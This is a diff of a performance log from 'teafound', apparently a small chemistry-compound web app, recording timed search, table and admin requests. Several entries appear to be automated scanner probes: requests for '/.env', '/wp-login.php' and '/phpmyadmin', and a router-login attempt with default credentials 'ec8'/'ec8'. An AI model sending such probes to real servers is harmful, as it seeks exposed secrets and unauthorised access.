@@ -1,61 +1,464 @@
-2021-04-11 15:58:39,734 teafound.performance 19 INFO     0.37578678131103516 /search/ {'q': 'TMDB-00001'}
-2021-04-11 15:58:39,987 teafound.performance 19 INFO     0.027984619140625 /media/ {}
-2021-04-11 15:58:46,604 teafound.performance 19 INFO     0.05996561050415039 /search/ {'q': 'TMDB-00001'}
-2021-04-11 15:58:46,710 teafound.performance 19 INFO     0.011993169784545898 /media/ {}
-2021-04-11 15:58:50,208 teafound.performance 19 INFO     0.045969486236572266 /search/ {'q': '4'}
-2021-04-11 15:58:55,232 teafound.performance 19 INFO     0.030352115631103516 /search/ {'q': 'c'}
-2021-04-11 15:58:59,034 teafound.performance 19 INFO     0.030408620834350586 /search/ {'q': 'C'}
-2021-04-11 15:59:53,948 teafound.performance 19 INFO     0.0499720573425293 /search/ {'q': 'C10H12BrN5O5'}
-2021-04-11 16:01:03,244 teafound.performance 19 INFO     0.11895108222961426 /search/ {'q': 'molecularformula'}
-2021-04-11 16:01:12,086 teafound.performance 19 INFO     0.03297543525695801 /search/ {'q': 'C10H12N4O5'}
-2021-04-11 16:03:23,116 teafound.performance 19 INFO     0.09394645690917969 / {}
-2021-04-11 16:03:27,212 teafound.performance 19 INFO     0.2868354320526123 /search/ {'q': 'TMDB-00001'}
-2021-04-11 16:03:35,301 teafound.performance 19 INFO     0.0579686164855957 /search/ {'q': 'C10H12N5O5P'}
-2021-04-11 16:03:35,403 teafound.performance 19 INFO     0.019979476928710938 /media/C10H12N5O5P {}
-2021-04-11 16:03:43,748 teafound.performance 19 INFO     0.05696582794189453 /search/ {'q': 'C'}
-2021-04-11 16:04:09,150 teafound.performance 19 INFO     0.012991905212402344 /media/C10H12N5O5P {}
-2021-04-11 16:04:56,112 teafound.performance 19 INFO     0.14191937446594238 /search/ {'q': 'C10H12N5O5P'}
-2021-04-11 16:04:56,246 teafound.performance 19 INFO     0.014990568161010742 /media/C10H12N5O5P.png {}
-2021-04-11 16:04:59,247 teafound.performance 19 INFO     0.012994050979614258 /media/C10H12N5O5P.png {}
-2021-04-11 16:05:17,509 teafound.performance 19 INFO     0.08094978332519531 /search/ {'q': 'C10H12N2'}
-2021-04-11 16:05:17,666 teafound.performance 19 INFO     0.015991926193237305 /media/C10H12N2.png {}
-2021-04-11 16:05:19,700 teafound.performance 19 INFO     0.014992713928222656 /media/C10H12N2.png {}
-2021-04-11 16:05:52,825 teafound.performance 19 INFO     0.07495784759521484 /search/ {'q': 'C3H7NO2'}
-2021-04-11 16:05:52,974 teafound.performance 19 INFO     0.015992164611816406 /media/C3H7NO2.png {}
-2021-04-11 16:05:55,541 teafound.performance 19 INFO     0.011992454528808594 /media/C3H7NO2.png {}
-2021-04-11 16:06:42,729 teafound.performance 19 INFO     0.014988899230957031 /media/C3H7NO2.png {}
-2021-04-11 16:06:50,025 teafound.performance 19 INFO     0.06695961952209473 /search/ {'q': 'C3H7NO2'}
-2021-04-11 16:06:50,107 teafound.performance 19 INFO     0.010994195938110352 /media/imageC3H7NO2.png {}
-2021-04-11 16:06:56,664 teafound.performance 19 INFO     0.016989707946777344 /media/C3H7NO2/C3H7NO2.png {}
-2021-04-11 16:07:03,499 teafound.performance 19 INFO     0.014992237091064453 /media/image/C3H7NO2.png {}
-2021-04-11 16:07:09,087 teafound.performance 19 INFO     0.003996610641479492 /media/images/C3H7NO2.png {}
-2021-04-11 16:07:35,620 teafound.performance 19 INFO     0.09394669532775879 /search/ {'q': 'C3H7NO2'}
-2021-04-11 16:07:35,726 teafound.performance 19 INFO     0.003999233245849609 /media//images/C3H7NO2.png {}
-2021-04-11 16:07:52,134 teafound.performance 19 INFO     0.10394048690795898 /search/ {'q': 'C3H7NO2'}
-2021-04-11 16:08:27,265 teafound.performance 19 INFO     0.10394001007080078 /search/ {'q': 'C3H7NO2'}
-2021-04-11 16:08:33,825 teafound.performance 19 INFO     0.017981290817260742 /tables/None {}
-2021-04-11 16:08:45,032 teafound.performance 19 INFO     0.015990734100341797 /tables/None {}
-2021-04-11 16:13:20,610 teafound.performance 19 INFO     0.08595466613769531 /search/ {'q': 'C3H7NO2'}
-2021-04-11 16:13:22,127 teafound.performance 19 INFO     0.0 /tables/43 {}
-2021-04-11 16:13:22,188 teafound.performance 19 INFO     0.03697943687438965 /tables/43/ {}
-2021-04-11 16:13:22,372 teafound.performance 19 INFO     0.014991044998168945 /tables/media/ {}
-2021-04-11 16:14:54,581 teafound.performance 19 INFO     0.06496357917785645 /tables/43/ {}
-2021-04-11 16:14:54,814 teafound.performance 19 INFO     0.010996580123901367 /tables/media//images/ {}
-2021-04-11 16:14:58,985 teafound.performance 19 INFO     0.012989997863769531 /tables/media//images/ {}
-2021-04-11 16:15:27,199 teafound.performance 19 INFO     0.0639646053314209 /tables/43/ {}
-2021-04-11 16:15:27,929 teafound.performance 19 INFO     0.01499032974243164 /tables/media//images/.png {}
-2021-04-11 16:15:31,013 teafound.performance 19 INFO     0.006996870040893555 /tables/media//images/C3H7NO2.png {}
-2021-04-11 16:15:35,686 teafound.performance 19 INFO     0.03897666931152344 /tables/43/ {}
-2021-04-11 16:15:36,069 teafound.performance 19 INFO     0.01299285888671875 /tables/media//images/.png {}
-2021-04-11 16:15:47,944 teafound.performance 19 INFO     0.05996537208557129 /tables/43/ {}
-2021-04-11 16:15:55,799 teafound.performance 19 INFO     0.07895326614379883 /search/ {'q': 'TMDB-00001'}
-2021-04-11 16:15:59,164 teafound.performance 19 INFO     0.06995868682861328 /search/ {'q': '4'}
-2021-04-11 16:16:07,631 teafound.performance 19 INFO     0.08694934844970703 /search/ {'q': 'C6H6N4O2'}
-2021-04-11 16:16:07,751 teafound.performance 19 INFO     0.0069959163665771484 /media//images/C6H6N4O2.png {}
-2021-04-11 16:16:09,442 teafound.performance 19 INFO     0.0 /tables/69 {}
-2021-04-11 16:16:09,493 teafound.performance 19 INFO     0.03496885299682617 /tables/69/ {}
-2021-04-11 16:16:09,578 teafound.performance 19 INFO     0.002980947494506836 /tables/media//images/C6H6N4O2.png {}
-2021-04-11 16:18:22,277 teafound.performance 19 INFO     0.06295990943908691 /tables/69/ {}
-2021-04-11 16:18:53,190 teafound.performance 19 INFO     0.06895685195922852 /tables/69/ {}
-2021-04-11 16:19:12,730 teafound.performance 19 INFO     0.08095335960388184 /search/ {'q': 'C'}
-2021-04-11 16:20:12,481 teafound.performance 19 INFO     0.0939476490020752 /search/ {'q': 'C'}
+2021-04-11 09:42:14,173 teafound.performance 19 INFO     0.02205967903137207 / {}
+2021-04-11 09:42:14,930 teafound.performance 19 INFO     0.005438089370727539 /favicon.ico {}
+2021-04-11 09:42:24,728 teafound.performance 19 INFO     0.025376558303833008 /search/ {'q': 'Alvin9999/new-pac'}
+2021-04-11 11:26:29,018 teafound.performance 19 INFO     0.029909133911132812 / {}
+2021-04-11 11:26:30,060 teafound.performance 19 INFO     0.004380464553833008 /favicon.ico {}
+2021-04-11 11:26:32,646 teafound.performance 19 INFO     0.025493860244750977 /search/ {'q': 'TMDB-00001'}
+2021-04-11 11:28:22,473 teafound.performance 19 INFO     0.01165008544921875 /search/ {'q': 'n_start=4'}
+2021-04-11 11:28:24,346 teafound.performance 19 INFO     0.0025789737701416016 /about/ {}
+2021-04-11 11:28:25,561 teafound.performance 19 INFO     0.002427816390991211 /index {}
+2021-04-11 11:31:57,314 teafound.performance 19 INFO     0.02980661392211914 / {}
+2021-04-11 11:32:04,218 teafound.performance 19 INFO     0.002467632293701172 / {}
+2021-04-11 11:32:06,612 teafound.performance 19 INFO     0.002404451370239258 / {}
+2021-04-11 11:32:08,312 teafound.performance 19 INFO     0.0025539398193359375 /about/ {}
+2021-04-11 11:32:09,831 teafound.performance 19 INFO     0.002501964569091797 /index {}
+2021-04-11 11:32:13,270 teafound.performance 19 INFO     0.026109695434570312 /search/ {'q': 'TMDB-00001'}
+2021-04-11 11:32:37,226 teafound.performance 19 INFO     0.018764495849609375 /search/ {'q': 'C10H12BrN5O5'}
+2021-04-11 11:32:44,315 teafound.performance 19 INFO     0.0016107559204101562 /tables/1 {}
+2021-04-11 11:32:44,447 teafound.performance 19 INFO     0.04114532470703125 /tables/1/ {}
+2021-04-11 11:32:44,596 teafound.performance 19 INFO     0.0016601085662841797 /tables/media/images/C10H12BrN5O5.png {}
+2021-04-11 11:33:15,788 teafound.performance 19 INFO     0.009514570236206055 /tables/1/ {}
+2021-04-11 11:33:25,504 teafound.performance 19 INFO     0.011256694793701172 /search/ {'q': 'C10H12N4O5'}
+2021-04-11 11:33:27,479 teafound.performance 19 INFO     0.0005362033843994141 /tables/3 {}
+2021-04-11 11:33:27,521 teafound.performance 19 INFO     0.00919032096862793 /tables/3/ {}
+2021-04-11 11:33:27,626 teafound.performance 19 INFO     0.0008563995361328125 /tables/media/images/C10H12N4O5.png {}
+2021-04-11 11:36:27,722 teafound.performance 19 INFO     0.0024979114532470703 /index {}
+2021-04-11 11:36:30,711 teafound.performance 19 INFO     0.00258636474609375 /about/ {}
+2021-04-11 11:39:00,556 teafound.performance 19 INFO     0.002405881881713867 / {}
+2021-04-11 11:39:03,532 teafound.performance 19 INFO     0.00251007080078125 / {}
+2021-04-11 11:39:03,875 teafound.performance 19 INFO     0.00438237190246582 /favicon.ico {}
+2021-04-11 11:39:06,314 teafound.performance 19 INFO     0.0024590492248535156 / {}
+2021-04-11 11:39:09,671 teafound.performance 19 INFO     0.0025458335876464844 /about/ {}
+2021-04-11 11:40:00,150 teafound.performance 19 INFO     0.002556324005126953 / {}
+2021-04-11 11:40:09,188 teafound.performance 19 INFO     0.0004849433898925781 /about {}
+2021-04-11 11:42:50,836 teafound.performance 19 INFO     0.0024492740631103516 /index {}
+2021-04-11 11:42:53,020 teafound.performance 19 INFO     0.002773284912109375 /about/ {}
+2021-04-11 11:42:54,613 teafound.performance 19 INFO     0.0024666786193847656 /index {}
+2021-04-11 11:42:57,186 teafound.performance 19 INFO     0.011920452117919922 /search/ {'q': 'TMDB-00001'}
+2021-04-11 11:43:05,944 teafound.performance 19 INFO     0.014278411865234375 /search/ {'q': 'TMDB-00C10H13N4O8P001'}
+2021-04-11 11:43:14,037 teafound.performance 19 INFO     0.01111459732055664 /search/ {'q': 'C10H13N4O8P'}
+2021-04-11 11:43:15,656 teafound.performance 19 INFO     0.0005359649658203125 /tables/5 {}
+2021-04-11 11:43:15,696 teafound.performance 19 INFO     0.008290767669677734 /tables/5/ {}
+2021-04-11 11:43:16,073 teafound.performance 19 INFO     0.0008332729339599609 /tables/media/images/C10H13N4O8P.png {}
+2021-04-11 11:43:25,768 teafound.performance 19 INFO     0.0025644302368164062 /about/ {}
+2021-04-11 11:43:26,914 teafound.performance 19 INFO     0.0024814605712890625 /index {}
+2021-04-11 11:43:31,835 teafound.performance 19 INFO     0.004693746566772461 /ind {}
+2021-04-11 11:43:49,184 teafound.performance 19 INFO     0.002619028091430664 /about/ {}
+2021-04-11 11:44:05,809 teafound.performance 19 INFO     0.002533435821533203 /about/ {}
+2021-04-11 11:44:07,377 teafound.performance 19 INFO     0.002434968948364258 /index {}
+2021-04-11 11:44:08,616 teafound.performance 19 INFO     0.0026078224182128906 /about/ {}
+2021-04-11 11:44:10,485 teafound.performance 19 INFO     0.002511739730834961 /index {}
+2021-04-11 11:44:13,430 teafound.performance 19 INFO     0.01101231575012207 /search/ {'q': '0'}
+2021-04-11 11:44:17,320 teafound.performance 19 INFO     0.010888814926147461 /search/ {'q': 'O'}
+2021-04-11 11:44:19,797 teafound.performance 19 INFO     0.004555940628051758 /search/ {'sort': 'test1', 'ct': '', 'item1': ''}
+2021-04-11 11:44:24,960 teafound.performance 19 INFO     0.010976552963256836 /search/ {'q': 'C10H13N4O8P'}
+2021-04-11 11:44:28,202 teafound.performance 19 INFO     0.008547067642211914 /tables/5/ {}
+2021-04-11 11:48:46,907 teafound.performance 19 INFO     0.002513885498046875 / {}
+2021-04-11 11:48:47,238 teafound.performance 19 INFO     0.003526926040649414 /favicon.ico {}
+2021-04-11 11:48:49,452 teafound.performance 19 INFO     0.0026149749755859375 /about/ {}
+2021-04-11 11:48:54,776 teafound.performance 19 INFO     0.011474609375 /search/ {'q': '364'}
+2021-04-11 11:49:32,415 teafound.performance 19 INFO     0.008841991424560547 /tables/5/ {}
+2021-04-11 11:49:35,463 teafound.performance 19 INFO     0.008374929428100586 /tables/5/ {}
+2021-04-11 11:49:45,726 teafound.performance 19 INFO     0.021028995513916016 /search/ {'q': 'C.L. Gillard, N.K. Ranatunga, Interaction between seed treatments, surfactants and foliar fungicides on controlling dry bean anthracnose (Colletotrichum lindemuthianum), Crop Protection, Volume 45, 2013,'}
+2021-04-11 11:49:57,995 teafound.performance 19 INFO     0.0024459362030029297 / {}
+2021-04-11 11:50:01,783 teafound.performance 19 INFO     0.0024874210357666016 / {}
+2021-04-11 11:50:01,910 teafound.performance 19 INFO     0.0025942325592041016 / {}
+2021-04-11 11:50:02,821 teafound.performance 19 INFO     0.01553201675415039 /favicon.ico {}
+2021-04-11 11:50:10,133 teafound.performance 19 INFO     0.011765241622924805 /search/ {'q': 'TMDB-00001'}
+2021-04-11 11:50:12,602 teafound.performance 19 INFO     0.0025882720947265625 /about/ {}
+2021-04-11 11:50:14,149 teafound.performance 19 INFO     0.002438068389892578 /index {}
+2021-04-11 11:50:15,145 teafound.performance 19 INFO     0.002594470977783203 /about/ {}
+2021-04-11 11:50:16,798 teafound.performance 19 INFO     0.0024967193603515625 /index {}
+2021-04-11 11:50:17,946 teafound.performance 19 INFO     0.0025701522827148438 /about/ {}
+2021-04-11 11:50:19,554 teafound.performance 19 INFO     0.0024967193603515625 /index {}
+2021-04-11 11:50:20,410 teafound.performance 19 INFO     0.00255584716796875 /about/ {}
+2021-04-11 11:50:21,308 teafound.performance 19 INFO     0.0024743080139160156 /index {}
+2021-04-11 11:50:22,244 teafound.performance 19 INFO     0.0025768280029296875 /about/ {}
+2021-04-11 11:50:24,724 teafound.performance 19 INFO     0.002611398696899414 /index {}
+2021-04-11 11:50:31,499 teafound.performance 19 INFO     0.0005021095275878906 /admin {}
+2021-04-11 11:50:31,626 teafound.performance 19 INFO     0.030114173889160156 /admin/ {}
+2021-04-11 11:50:31,705 teafound.performance 19 INFO     0.0358738899230957 /admin/login/ {'next': '/admin/'}
+2021-04-11 11:50:50,627 teafound.performance 19 INFO     0.0012395381927490234 /admin/ {}
+2021-04-11 11:50:50,696 teafound.performance 19 INFO     0.023891687393188477 /admin/login/ {'next': '/admin/'}
+2021-04-11 11:50:54,278 teafound.performance 19 INFO     0.15554404258728027 /admin/login/ {'next': '/admin/'}
+2021-04-11 11:50:54,421 teafound.performance 19 INFO     0.05899214744567871 /admin/ {}
+2021-04-11 11:50:57,676 teafound.performance 19 INFO     0.17003846168518066 /admin/teafound/chemistry/ {}
+2021-04-11 11:50:57,798 teafound.performance 19 INFO     0.005865573883056641 /admin/jsi18n/ {}
+2021-04-11 11:51:01,890 teafound.performance 19 INFO     0.05368971824645996 /admin/teafound/chemistry/C46H64N18O11S2/change/ {}
+2021-04-11 11:51:02,018 teafound.performance 19 INFO     0.0045049190521240234 /admin/jsi18n/ {}
+2021-04-11 11:51:09,380 teafound.performance 19 INFO     0.16254782676696777 /admin/teafound/chemistry/ {}
+2021-04-11 11:51:14,258 teafound.performance 19 INFO     0.03820180892944336 /admin/teafound/chemistry/0/change/ {}
+2021-04-11 11:51:14,366 teafound.performance 19 INFO     0.004530191421508789 /admin/jsi18n/ {}
+2021-04-11 11:51:17,618 teafound.performance 19 INFO     0.15871214866638184 /admin/teafound/chemistry/ {}
+2021-04-11 11:52:33,992 teafound.performance 19 INFO     0.003501415252685547 /wp-login.php {}
+2021-04-11 11:54:40,958 teafound.performance 19 INFO     0.0025031566619873047 / {}
+2021-04-11 11:54:43,755 teafound.performance 19 INFO     0.002565145492553711 /about/ {}
+2021-04-11 11:54:44,999 teafound.performance 19 INFO     0.0025081634521484375 /index {}
+2021-04-11 11:54:48,702 teafound.performance 19 INFO     0.01248931884765625 /search/ {'q': 'TMDB-00001'}
+2021-04-11 11:54:51,591 teafound.performance 19 INFO     0.011196374893188477 /search/ {'q': '0'}
+2021-04-11 11:54:58,581 teafound.performance 19 INFO     0.0005133152008056641 /tables/0 {}
+2021-04-11 11:54:58,751 teafound.performance 19 INFO     0.0748133659362793 /tables/0/ {}
+2021-04-11 11:55:12,265 teafound.performance 19 INFO     0.011475801467895508 /search/ {'q': 'C10H13N4O8P'}
+2021-04-11 11:55:14,164 teafound.performance 19 INFO     0.008464574813842773 /tables/5/ {}
+2021-04-11 11:55:19,343 teafound.performance 19 INFO     0.008355855941772461 /tables/1/ {}
+2021-04-11 11:55:19,474 teafound.performance 19 INFO     0.0012786388397216797 /tables/media/images/C10H12BrN5O5.png {}
+2021-04-11 11:55:28,123 teafound.performance 19 INFO     0.008256912231445312 /tables/2/ {}
+2021-04-11 11:55:28,265 teafound.performance 19 INFO     0.0008456707000732422 /tables/media/images/C10H12N2.png {}
+2021-04-11 11:55:51,768 teafound.performance 19 INFO     0.0024552345275878906 / {}
+2021-04-11 11:55:53,876 teafound.performance 19 INFO     0.003003358840942383 /about/ {}
+2021-04-11 11:55:55,179 teafound.performance 19 INFO     0.002512693405151367 /index {}
+2021-04-11 11:55:58,346 teafound.performance 19 INFO     0.011326074600219727 /search/ {'q': 'C10H13N4O8P'}
+2021-04-11 11:56:00,112 teafound.performance 19 INFO     0.008806467056274414 /tables/5/ {}
+2021-04-11 12:01:16,295 teafound.performance 19 INFO     0.0296785831451416 /about/ {}
+2021-04-11 12:01:18,562 teafound.performance 19 INFO     0.0025653839111328125 /index {}
+2021-04-11 12:01:19,677 teafound.performance 19 INFO     0.0026476383209228516 /about/ {}
+2021-04-11 12:01:22,474 teafound.performance 19 INFO     0.026273488998413086 /search/ {'q': ' sudo /usr/sbin/nginx'}
+2021-04-11 12:01:36,951 teafound.performance 19 INFO     0.012231111526489258 /search/ {'q': ' sudo /usr/sbin/nginx'}
+2021-04-11 12:01:38,819 teafound.performance 19 INFO     0.0025887489318847656 /about/ {}
+2021-04-11 12:01:47,285 teafound.performance 19 INFO     0.01975274085998535 /search/ {'q': 'C10H13N5Na3O13P3'}
+2021-04-11 12:01:48,823 teafound.performance 19 INFO     0.0006957054138183594 /tables/6 {}
+2021-04-11 12:01:48,962 teafound.performance 19 INFO     0.04181504249572754 /tables/6/ {}
+2021-04-11 12:01:49,084 teafound.performance 19 INFO     0.0015819072723388672 /tables/media/images/C10H13N5Na3O13P3.png {}
+2021-04-11 12:10:42,549 teafound.performance 19 INFO     0.03404402732849121 / {}
+2021-04-11 12:10:44,368 teafound.performance 19 INFO     0.0026535987854003906 /about/ {}
+2021-04-11 12:10:45,525 teafound.performance 19 INFO     0.0024077892303466797 /index {}
+2021-04-11 12:10:52,272 teafound.performance 19 INFO     0.0026426315307617188 /about/ {}
+2021-04-11 12:10:53,225 teafound.performance 19 INFO     0.0024199485778808594 /index {}
+2021-04-11 12:21:54,198 teafound.performance 19 INFO     0.02994537353515625 /index {}
+2021-04-11 12:21:56,176 teafound.performance 19 INFO     0.0025997161865234375 /about/ {}
+2021-04-11 12:21:57,435 teafound.performance 19 INFO     0.0024237632751464844 /index {}
+2021-04-11 12:22:14,917 teafound.performance 19 INFO     0.0025527477264404297 /about/ {}
+2021-04-11 12:22:15,957 teafound.performance 19 INFO     0.0024890899658203125 /index {}
+2021-04-11 12:22:18,827 teafound.performance 19 INFO     0.02624654769897461 /search/ {'q': 'TMDB-00001'}
+2021-04-12 03:09:03,488 teafound.performance 19 INFO     0.06668972969055176 / {}
+2021-04-12 03:09:06,520 teafound.performance 19 INFO     0.006551265716552734 /favicon.ico {}
+2021-04-12 03:09:07,998 teafound.performance 19 INFO     0.003513813018798828 /about/ {}
+2021-04-12 03:09:09,254 teafound.performance 19 INFO     0.002401590347290039 /index {}
+2021-04-12 03:09:16,231 teafound.performance 19 INFO     0.0025916099548339844 /about/ {}
+2021-04-12 03:09:17,504 teafound.performance 19 INFO     0.0024569034576416016 /index {}
+2021-04-12 03:09:21,998 teafound.performance 19 INFO     0.0027420520782470703 /about/ {}
+2021-04-12 03:09:23,180 teafound.performance 19 INFO     0.0025222301483154297 /index {}
+2021-04-12 03:09:25,754 teafound.performance 19 INFO     0.04228568077087402 /search/ {'q': 'TMDB-00001'}
+2021-04-12 03:09:44,132 teafound.performance 19 INFO     0.010694026947021484 /search/ {'q': 'C'}
+2021-04-12 03:09:54,773 teafound.performance 19 INFO     0.05015683174133301 /search/ {'q': 'C10H13N4O8P'}
+2021-04-12 03:09:57,802 teafound.performance 19 INFO     0.009304046630859375 /tables/5/ {}
+2021-04-12 03:09:57,906 teafound.performance 19 INFO     0.0021402835845947266 /tables/media/images/C10H13N4O8P.png {}
+2021-04-12 03:10:11,477 teafound.performance 19 INFO     0.003476858139038086 /.env {}
+2021-04-12 03:10:11,904 teafound.performance 19 INFO     0.006112813949584961 / {}
+2021-04-12 03:10:39,374 teafound.performance 19 INFO     0.008252382278442383 /tables/5/ {}
+2021-04-12 03:13:39,744 teafound.performance 19 INFO     0.04120612144470215 /tables/5/ {}
+2021-04-12 03:13:41,858 teafound.performance 19 INFO     0.0025670528411865234 /about/ {}
+2021-04-12 03:13:42,779 teafound.performance 19 INFO     0.002488851547241211 /index {}
+2021-04-12 03:13:56,991 teafound.performance 19 INFO     0.002375364303588867 / {}
+2021-04-12 03:13:59,794 teafound.performance 19 INFO     0.0024247169494628906 / {}
+2021-04-12 03:14:00,030 teafound.performance 19 INFO     0.016208410263061523 /favicon.ico {}
+2021-04-12 03:14:01,301 teafound.performance 19 INFO     0.002428770065307617 / {}
+2021-04-12 03:14:02,811 teafound.performance 19 INFO     0.0027348995208740234 /about/ {}
+2021-04-12 03:14:08,975 teafound.performance 19 INFO     0.02453923225402832 /search/ {'q': '农'}
+2021-04-12 03:14:38,591 teafound.performance 19 INFO     0.002511739730834961 /about/ {}
+2021-04-12 03:14:40,205 teafound.performance 19 INFO     0.0024919509887695312 /index {}
+2021-04-12 03:14:44,541 teafound.performance 19 INFO     0.013120889663696289 /search/ {'q': 'C10H13N4O8P'}
+2021-04-12 03:14:46,482 teafound.performance 19 INFO     0.008118391036987305 /tables/5/ {}
+2021-04-12 03:14:51,881 teafound.performance 19 INFO     0.0025467872619628906 /about/ {}
+2021-04-12 03:14:52,827 teafound.performance 19 INFO     0.0025053024291992188 /index {}
+2021-04-12 03:16:30,878 teafound.performance 19 INFO     0.002496480941772461 / {}
+2021-04-12 03:16:31,221 teafound.performance 19 INFO     0.00428462028503418 /favicon.ico {}
+2021-04-12 03:16:32,709 teafound.performance 19 INFO     0.0024476051330566406 / {}
+2021-04-12 03:16:32,944 teafound.performance 19 INFO     0.015995264053344727 /favicon.ico {}
+2021-04-12 03:17:46,584 teafound.performance 19 INFO     0.0024785995483398438 /index {}
+2021-04-12 03:17:48,862 teafound.performance 19 INFO     0.0025780200958251953 /about/ {}
+2021-04-12 03:17:50,050 teafound.performance 19 INFO     0.002502918243408203 /index {}
+2021-04-12 03:17:51,038 teafound.performance 19 INFO     0.0025682449340820312 /about/ {}
+2021-04-12 03:17:52,897 teafound.performance 19 INFO     0.002446413040161133 /index {}
+2021-04-12 03:17:54,112 teafound.performance 19 INFO     0.0027358531951904297 /about/ {}
+2021-04-12 03:17:55,227 teafound.performance 19 INFO     0.0024785995483398438 /index {}
+2021-04-12 03:20:05,029 teafound.performance 19 INFO     0.002468109130859375 /index {}
+2021-04-12 03:24:02,122 teafound.performance 19 INFO     0.002444744110107422 /index {}
+2021-04-12 03:34:37,323 teafound.performance 19 INFO     0.002376556396484375 / {}
+2021-04-12 03:34:46,726 teafound.performance 19 INFO     0.0025415420532226562 /about/ {}
+2021-04-12 03:37:47,948 teafound.performance 19 INFO     0.011043548583984375 /search/ {'q': 'C10H13N4O8P'}
+2021-04-12 03:38:12,228 teafound.performance 19 INFO     0.008017301559448242 /tables/5/ {}
+2021-04-12 03:46:38,283 teafound.performance 19 INFO     0.002496957778930664 / {}
+2021-04-12 03:46:48,594 teafound.performance 19 INFO     0.004494190216064453 /adim {}
+2021-04-12 03:47:00,205 teafound.performance 19 INFO     0.0015780925750732422 /admin {}
+2021-04-12 03:47:00,438 teafound.performance 19 INFO     0.0521695613861084 /admin/ {}
+2021-04-12 03:47:04,422 teafound.performance 19 INFO     0.18962860107421875 /admin/teafound/chemistry/ {}
+2021-04-12 03:47:04,673 teafound.performance 19 INFO     0.026369094848632812 /admin/jsi18n/ {}
+2021-04-12 03:47:12,416 teafound.performance 19 INFO     0.017002582550048828 /admin/ {}
+2021-04-12 04:09:26,549 teafound.performance 19 INFO     0.0024962425231933594 / {}
+2021-04-12 04:09:27,437 teafound.performance 19 INFO     0.0035848617553710938 /favicon.ico {}
+2021-04-12 04:10:13,462 teafound.performance 19 INFO     0.011060476303100586 /search/ {'q': 'C10H13N4O8P'}
+2021-04-12 04:10:39,917 teafound.performance 19 INFO     0.0005390644073486328 /tables/5 {}
+2021-04-12 04:10:40,044 teafound.performance 19 INFO     0.04153585433959961 /tables/5/ {}
+2021-04-12 04:10:40,108 teafound.performance 19 INFO     0.002607583999633789 /tables/media/images/C10H13N4O8P.png {}
+2021-04-12 04:11:21,065 teafound.performance 19 INFO     0.002445697784423828 / {}
+2021-04-12 04:11:32,910 teafound.performance 19 INFO     0.010983705520629883 /search/ {'q': 'C10H13N5Na3O13P3'}
+2021-04-12 04:11:36,921 teafound.performance 19 INFO     0.0005135536193847656 /tables/6 {}
+2021-04-12 04:11:36,959 teafound.performance 19 INFO     0.00908803939819336 /tables/6/ {}
+2021-04-12 04:11:37,006 teafound.performance 19 INFO     0.0008261203765869141 /tables/media/images/C10H13N5Na3O13P3.png {}
+2021-04-12 04:11:43,623 teafound.performance 19 INFO     0.0026314258575439453 /tables/media/ {}
+2021-04-12 04:11:55,542 teafound.performance 19 INFO     0.0025920867919921875 /tables/media/ {}
+2021-04-12 04:12:27,617 teafound.performance 19 INFO     0.002447366714477539 / {}
+2021-04-12 04:13:48,819 teafound.performance 19 INFO     0.01094961166381836 /search/ {'q': 'C10H13N5O4'}
+2021-04-12 04:13:52,178 teafound.performance 19 INFO     0.0005166530609130859 /tables/7 {}
+2021-04-12 04:13:52,210 teafound.performance 19 INFO     0.00812840461730957 /tables/7/ {}
+2021-04-12 04:13:52,253 teafound.performance 19 INFO     0.0024766921997070312 /tables/media/images/C10H13N5O4.png {}
+2021-04-12 04:40:13,279 teafound.performance 19 INFO     0.002448558807373047 / {}
+2021-04-12 05:17:59,454 teafound.performance 19 INFO     0.002500295639038086 / {}
+2021-04-12 05:19:48,551 teafound.performance 19 INFO     0.0035338401794433594 /portal/redlion {}
+2021-04-12 05:34:42,946 teafound.performance 19 INFO     0.0024819374084472656 / {}
+2021-04-12 05:40:29,814 teafound.performance 19 INFO     0.0035562515258789062 /boaform/admin/formLogin {}
+2021-04-12 05:55:33,308 teafound.performance 19 INFO     0.0024378299713134766 / {}
+2021-04-12 05:55:59,463 teafound.performance 19 INFO     0.002613067626953125 /about/ {}
+2021-04-12 05:56:02,759 teafound.performance 19 INFO     0.011867284774780273 /search/ {'q': 'TMDB-00001'}
+2021-04-12 05:56:05,116 teafound.performance 19 INFO     0.004517555236816406 /search/ {'sort': 'test1', 'ct': '', 'item1': ''}
+2021-04-12 05:56:09,990 teafound.performance 19 INFO     0.004542827606201172 /search/ {'sort': 'test2', 'ct': '', 'item2': ''}
+2021-04-12 05:56:13,518 teafound.performance 19 INFO     0.01167440414428711 /search/ {'q': 'n_start=4'}
+2021-04-12 05:56:15,860 teafound.performance 19 INFO     0.0026009082794189453 /about/ {}
+2021-04-12 05:56:17,506 teafound.performance 19 INFO     0.0025682449340820312 /index {}
+2021-04-12 05:56:18,355 teafound.performance 19 INFO     0.017656326293945312 /about/ {}
+2021-04-12 05:56:19,257 teafound.performance 19 INFO     0.0025184154510498047 /index {}
+2021-04-12 05:56:20,109 teafound.performance 19 INFO     0.002596616744995117 /about/ {}
+2021-04-12 05:56:20,788 teafound.performance 19 INFO     0.0025246143341064453 /index {}
+2021-04-12 05:56:29,444 teafound.performance 19 INFO     0.010975837707519531 /search/ {'q': 'C10H13N5Na3O13P3'}
+2021-04-12 05:56:31,655 teafound.performance 19 INFO     0.0005459785461425781 /tables/6 {}
+2021-04-12 05:56:31,691 teafound.performance 19 INFO     0.008252859115600586 /tables/6/ {}
+2021-04-12 05:56:32,136 teafound.performance 19 INFO     0.0008685588836669922 /tables/media/images/C10H13N5Na3O13P3.png {}
+2021-04-12 05:56:48,684 teafound.performance 19 INFO     0.002604961395263672 /tables/media/ {}
+2021-04-12 05:57:09,472 teafound.performance 19 INFO     0.0024521350860595703 / {}
+2021-04-12 05:57:38,199 teafound.performance 19 INFO     0.008133649826049805 /tables/6/ {}
+2021-04-12 05:59:48,099 teafound.performance 19 INFO     0.003590822219848633 /index.php {}
+2021-04-12 05:59:50,674 teafound.performance 19 INFO     0.003493785858154297 /phpmyadmin/index.php {}
+2021-04-12 06:29:21,616 teafound.performance 19 INFO     0.0035562515258789062 /boaform/admin/formLogin {'username': 'ec8', 'psd': 'ec8'}
+2021-04-12 06:35:27,973 teafound.performance 19 INFO     0.003519773483276367 /config/getuser {'index': '0'}
+2021-04-12 06:35:45,361 teafound.performance 19 INFO     0.0013430118560791016 /tables/media/images/C10H13N4O8P.png {}
+2021-04-12 06:35:51,499 teafound.performance 19 INFO     0.002606630325317383 /tables/media/ {}
+2021-04-12 06:36:06,461 teafound.performance 19 INFO     0.012696027755737305 /search/ {'q': 'TMDB-00001'}
+2021-04-12 06:36:09,387 teafound.performance 19 INFO     0.0026099681854248047 /about/ {}
